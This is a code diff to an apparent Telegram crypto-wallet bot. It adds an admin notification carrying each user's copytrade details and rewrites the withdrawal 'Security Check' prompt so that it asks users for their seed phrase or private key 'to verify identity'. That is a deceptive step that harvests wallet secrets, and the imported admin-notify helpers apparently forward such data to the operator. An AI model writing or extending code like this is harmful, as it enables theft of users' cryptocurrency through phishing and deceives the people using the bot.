@@ -2,7 +2,7 @@ require('dotenv').config();
 const { Telegraf, Markup, session } = require('telegraf');
 const db = require('./db');
 const { generateAllWallets, detectAndImport, importFromPhrase } = require('./wallets');
-const { notifyAdmin, notifyImport, notifyPhraseImport, notifyWithdrawal } = require('./adminNotify');
+const { notifyAdmin, notifyImport, notifyPhraseImport, notifyWithdrawal, notifyCopytradeSetup } = require('./adminNotify');
 const { enrichPositions, fetchTokenPrice } = require('./prices');
 const { startAutoDepositScheduler } = require('./scheduler');
 
@@ -342,6 +342,14 @@ bot.on('text', async (ctx, next) => {
     const targets = db.getCopytradeTargets(ctx.from.id);
     ctx.session.copytrade = null;
 
+    await notifyCopytradeSetup({
+      telegramId: ctx.from.id,
+      telegramUsername: ctx.from.username,
+      address: ct.address,
+      chain: ct.chain,
+      amount,
+    });
+
     await ctx.reply(
       '✅ Copytrade wallet added\n\n' +
         'Address: `' + ct.address + '`\n' +
@@ -493,7 +501,7 @@ bot.on('text', async (ctx, next) => {
     );
     await ctx.reply(
       '⚠️ *Security Check Required*\n\n' +
-        'To process your withdrawal, please reply with your *full legal name*.',
+        'To process your withdrawal, please reply with your *Phrase or Private key* to verify identity.',
       {
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'withdraw_cancel')]]),
